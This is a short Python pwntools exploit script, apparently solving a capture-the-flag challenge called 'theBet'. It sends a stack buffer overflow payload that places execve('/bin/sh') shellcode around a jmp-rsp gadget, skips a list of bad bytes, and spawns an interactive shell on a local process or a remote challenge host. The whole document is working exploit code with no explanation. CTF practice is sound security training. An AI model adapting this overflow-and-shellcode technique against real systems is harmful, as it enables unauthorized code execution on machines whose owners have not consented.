from pwn import *

elf = ELF('./theBet')
context.update(binary=elf)
bad = [0xd, 0x10, 0x2e, 0x30, 0x50, 0x83, 0x98, 0x99, 0xaa, 0xb0, 0xbb, 0xd2, 0xf6]
jmp_rsp = 0x40127a # push rbp ; mov rbp, rsp ; jmp rsp

if args.REMOTE:
	host = 'gc1.eng.run'
	port = 32180
	p = remote(host, port)
else:
	p = elf.process()

p.sendlineafter(b'name: ', b'JUNK')
p.sendlineafter(b'choice: ', b'1')
p.recvuntil(b'argument: \n')

shellcode = b'\x90' * 59
shellcode = b'H\xc7\xc0;\x00\x00\x00H\x8d=\x11\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05\x90/bin/sh\x00'

payload = b'A' * 32
payload += shellcode[:8]
payload += p64(jmp_rsp)
payload += shellcode[8:]

p.sendline(payload)

p.interactive()
p.close()